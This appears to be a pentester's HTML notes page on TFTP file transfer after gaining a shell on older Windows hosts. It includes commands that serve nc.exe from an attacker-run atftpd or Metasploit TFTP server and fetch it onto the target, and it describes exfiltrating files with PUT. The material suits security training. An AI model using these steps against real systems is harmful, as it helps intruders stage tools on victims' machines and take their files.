<title>TFTP</title>
</head><body>Works by default on:<br/>
Windows XP<br/>
Windows 2003<br/>
<br/>
A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactively. Which means less risk of losing your shell.<br/>
<br/>
You can upload and download whatever from the windows-machine like this<br/>
tftp -i 192.160.1.101 GET wget.exe<br/>
tftp -i 192.160.1.101 GET wget.exe .\path\new_filename.exe<br/>
<br/>
If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-interactive way.<br/>
tftp 192.160.1.101<br/>
GET test.txt<br/>
<br/>
I usually put all files I want to make available in /srv/tftp<br/>
If you want to make sure that the file was uploaded correct you can check in the syslog. Grep for the IP like this:<br/>
grep 192.168.1.101 /var/log/syslog<br/>
<br/>
<br/>
<br/>
<br/>
Starting the built-in atftpd server<br/>
Kali comes with a TFTP server installed, atftpd, which can be started with a simple service atftpd start. <br/>
mkdir /tftp<br/>
atftpd --daemon --port 69 /tftp<br/>
cp /usr/share/windows-binaries/nc.exe /tftp/<br/>
<br/>
And connect to it from Windows:<br/>
tftp -i &lt;LHOST&gt; get nc.exe<br/>
<br/>
<br/>
<br/>
<br/>
TFTP with Measploit Aux module<br/>
I've always had a hell of a time getting it configured and working though, and I rarely need to start and keep running a TFTP server as a service, so I just use the simpler Metasploit module.<br/>
&nbsp;<br/>
Metasploit, like with FTP, has an auxiliary TFTP server module at auxiliary/server/tftp. Set the module options, including TFTPROOT, which determines which directory to serve up, and OUTPUTPATH if you want to capture TFTP uploads from Windows as well.<br/>

&nbsp;Downloading the Files <br/>
Again, assuming the tftp utility is installed, you can grab a file with one line from the Windows prompt. It doesn't require any authentication. Just simply use the -i flag and the GET action. <br/>
&nbsp; <br/>
Exfiltrating files via TFTP is simple as well with the PUT action. The Metasploit server saves them in /tmp by default<br/>
&nbsp;<br/>

<br/>
TFTP is a convenient, simple way to transfer files as it doesn't require authentication and you can do everything in a single command.<br/>
&nbsp;<br/>
<b>Sidenote: Installing TFTP</b>. As I mentioned, TFTP is not included by default on newer versions of Windows. If you really wanted to, you can actually enable TFTP from the command line:<br/>
&nbsp;pkgmgr /iu:"TFTP" &nbsp;<br/>
Might come in handy, but I'd always rather "live off the land" and use tools that are already available.<br/>
